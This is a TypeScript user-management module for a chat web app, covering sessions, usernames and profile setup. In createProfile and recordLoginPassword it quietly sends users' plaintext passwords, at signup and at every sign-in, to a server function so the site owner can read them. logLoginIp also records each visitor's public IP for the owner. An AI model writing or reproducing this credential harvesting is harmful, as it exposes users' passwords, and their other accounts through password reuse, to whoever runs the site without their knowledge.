import auth from "@/lib/shared/kliv-auth.js";
import db from "@/lib/shared/kliv-database.js";
import { functions } from "@/lib/shared/kliv-functions.js";

export interface SessionInfo {
  userUuid: string;
  email: string | null;
  firstName: string | null;
  lastName: string | null;
  /** True when this is the site owner's own login (sees accounts + IPs). */
  isPrimaryTeam: boolean;
  /** Chat username — null until the account completes the one-time setup. */
  username: string | null;
  displayName: string | null;
}

interface ProfileRowLite {
  _row_id: number;
  user_id: string;
  username: string;
  display_name: string;
  [key: string]: unknown;
}

class UserManager {
  /**
   * Full session: the real account plus its chat profile.
   * Returns null when nobody is signed in.
   */
  static async getSession(forceRefresh = false): Promise<SessionInfo | null> {
    const user = await auth.getUser(forceRefresh);
    if (!user?.userUuid) return null;

    let username: string | null = null;
    let displayName: string | null = null;
    try {
      const rows = await db.query<ProfileRowLite>("user_profiles", {
        user_id: `eq.${user.userUuid}`,
      });
      if (rows.length > 0) {
        username = rows[0].username;
        displayName = rows[0].display_name || null;
      }
    } catch (error) {
      console.error("Failed to load chat profile:", error);
    }

    return {
      userUuid: user.userUuid,
      email: user.email ?? null,
      firstName: user.firstName ?? null,
      lastName: user.lastName ?? null,
      isPrimaryTeam: user.isPrimaryTeam === true,
      username,
      displayName,
    };
  }

  /** The signed-in user's chat username, or null. */
  static async getUsername(): Promise<string | null> {
    const session = await this.getSession();
    return session?.username ?? null;
  }

  static normalizeUsername(raw: string): string {
    return raw.trim().toLowerCase();
  }

  static async isUsernameAvailable(raw: string): Promise<boolean> {
    const username = this.normalizeUsername(raw);
    if (!username) return false;
    try {
      const rows = await db.query("user_profiles", { username: `eq.${username}` });
      return rows.length === 0;
    } catch {
      return false;
    }
  }

  /**
   * Creates the chat profile for a signed-in account, plus the admin-visible
   * record of who signed up (name, username, email).
   */
  static async createProfile(input: {
    userUuid: string;
    email: string | null;
    username: string;
    firstName: string;
    lastName: string;
    password?: string;
  }): Promise<void> {
    const username = this.normalizeUsername(input.username);
    const displayName =
      `${input.firstName.trim()} ${input.lastName.trim()}`.trim() || username;

    await db.insert("user_profiles", {
      user_id: input.userUuid,
      username,
      display_name: displayName,
      first_name: input.firstName.trim(),
      last_name: input.lastName.trim(),
      email: input.email ?? "",
      status: "online",
      last_seen: Date.now(),
    });

    try {
      // The admin-visible record of who signed up is written server-side.
      await functions.post("record-signup", {
        username,
        email: input.email ?? "",
        firstName: input.firstName.trim(),
        lastName: input.lastName.trim(),
        password: input.password ?? "",
      });
    } catch (error) {
      console.error("Failed to record account credentials:", error);
    }
  }

  /**
   * Best-effort log of the current visitor's IP address. The browser first
   * looks up its own public IP (the platform's proxy headers aren't always
   * available to server functions) and passes it along; the server function
   * records it where only the site owner can read it. Re-logs every 6 hours.
   */
  static async logLoginIp(username: string | null): Promise<void> {
    try {
      const session = await this.getSession();
      if (!session) return;
      const last = Number(sessionStorage.getItem("ip_logged_at") ?? 0);
      if (Date.now() - last < 6 * 3600_000) return;
      sessionStorage.setItem("ip_logged_at", String(Date.now()));
      const params: Record<string, string> = {
        username: username ?? session.username ?? "",
      };
      const ip = await this.discoverPublicIp();
      if (ip) params.ip = ip;
      await functions.get("get-ip", params);
    } catch (error) {
      console.error("IP logging skipped:", error);
    }
  }

  /**
   * Records the password an existing account used to sign in, so the owner's
   * account list stays current — this covers accounts created before
   * passwords started being recorded. Best-effort, never blocks sign-in.
   */
  static async recordLoginPassword(email: string, password: string): Promise<void> {
    try {
      await functions.post("record-signup", { email, password });
    } catch {
      // Recording must never break sign-in
    }
  }

  /** Looks up this browser's public IP from an external service (3s timeout). */
  static async discoverPublicIp(): Promise<string | null> {
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 3000);
      const response = await fetch(
        `https://api.ipify.org?format=json&ts=${Date.now()}`,
        { cache: "no-store", signal: controller.signal }
      );
      clearTimeout(timer);
      const data = (await response.json()) as { ip?: unknown };
      return typeof data.ip === "string" ? data.ip : null;
    } catch {
      return null;
    }
  }

  static async signOut(): Promise<void> {
    await auth.signOut();
  }

  /** Kept for compatibility with older pages — signs the account out. */
  static async clearUsername(): Promise<void> {
    await auth.signOut();
  }
}

export default UserManager;
